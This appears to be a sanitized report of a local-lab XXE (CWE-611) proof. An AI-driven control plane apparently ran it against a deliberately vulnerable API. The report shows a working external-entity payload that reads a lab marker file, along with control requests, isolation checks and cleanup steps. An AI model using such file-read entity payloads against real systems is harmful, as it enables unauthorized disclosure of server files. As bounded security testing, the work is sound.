> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# Modern API XXE Safe-Marker Wave 1 — 2026-05-23

Status: completed / verified local-lab safe-marker XXE proof
Date: 2026-05-23
Route/tool: Windows Hermes control plane -> `<attacker-vm>` attacker -> Docker-published `modern_vuln_api` on `<victim-vm>`
Visible runtime/model: Hermes current session, `gpt-5.5 / openai-codex`
Target: `http://<lab-ip>:18081`
Runner: `scripts/labs/modern_api_xxe_safe_marker_wave1.sh`
Artifacts: `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/`

## Vulnerability class

- CWE-611: Improper Restriction of XML External Entity Reference
- OWASP mapping: A05-style parser/security misconfiguration lane; local-learning-lab only
- Risk lane: active local proof, non-destructive

## OSS-first reconnaissance

Decision: `adapt` / `write-custom bounded runner`.

References saved under:

- `setting/local/oss_refs/xxe_safe_marker_20260523/PayloadsAllTheThings_XXE_README.md`
- `setting/local/oss_refs/xxe_safe_marker_20260523/OWASP_XXE_Prevention_Cheat_Sheet.md`
- `setting/local/oss_refs/xxe_safe_marker_20260523/nuclei_generic_xxe.yaml` was attempted but fetched as only 14 bytes; treat as invalid/check-later.

Rationale:

- Public XXE references confirm file entity and OOB callback patterns, but for this project the safe local proof should avoid `/etc/passwd`, cloud metadata, public OAST, and external callback.
- The correct adaptation is a lab-owned marker file, positive XXE-style request, and no-entity/wrong-file controls.
- A small custom runner is more deterministic and safer than a broad scanner for this one-vulnerability proof wave.

## Setup / route

1. Verified attacker/victim NAT posture before execution:
   - attacker `<lab-ip>`: Internet closed
   - victim `<lab-ip>`: Internet closed
2. Reused previously pulled `python:3-alpine` image on victim; no new NAT window needed in this wave.
3. Copied current `modern_vuln_api.py` to victim path `/home/kali/hermes-labs/modern_vuln_api/`.
4. Started Docker-published target container:

```text
modern-api-xxe-18081
<lab-ip>:18081 -> container:18081
```

5. Verified attacker-to-target health before runner execution.

## Proof

Positive request:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///tmp/hermes_modern_api_xxe_marker.txt"> ]>
<data>&xxe;</data>
```

Positive observed result:

```text
positive_status: 200
positive_marker_found: yes
positive_marker: XXE_SAFE_MARKER_HERMES_LOCAL_LAB
```

Controls:

```text
no_entity_control_status: 200
no_entity_control_marker:
wrong_file_control_status: 200
wrong_file_control_marker:
controls_ok: yes
post_health: 200
verdict: verified_impact_lab_only
```

## Evidence

- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/summary.md`
- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/observations.jsonl`
- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/payload/positive_xxe_marker.xml`
- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/http/positive_response.json`
- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/control/no_entity_control.xml`
- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/control/wrong_file_control.xml`
- `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/cleanup/`

## Cleanup / recovery

Completed:

- Removed victim target container `modern-api-xxe-18081`.
- Verified victim Internet closed.
- Verified attacker Internet closed.
- Pulled artifacts to Windows.

No snapshot restore was needed.

## Boundaries

- Local authorized lab only.
- Only lab-owned marker file `/tmp/hermes_modern_api_xxe_marker.txt` was requested.
- No `/etc/passwd`, cloud metadata, internal scanning, external callback, public OAST, secrets, credential theft, or exfiltration.
- No public/unknown target.

## Project benefit

- Converts the older multi-vulnerability `modern_api_wave2_test.sh` XXE section into a dedicated one-vulnerability runner with positive/control evidence.
- Strengthens the file-read / XXE safe-marker lane without triggering the SSRF/callback execution-layer blocker.
- Confirms Docker-published victim target route remains useful for cross-VM modern API proofs.
- Produces clean evidence packet components that can be reused for future report-readiness gates.

## Next useful follow-up

- Promote the same safe-marker/control shape to a generic evidence-packet template for parser/file-read proof lanes.
- Consider a separate operator-run run-card only if future XXE OOB callback proof is needed; do not mix OOB callback into this safe-marker verified flow.
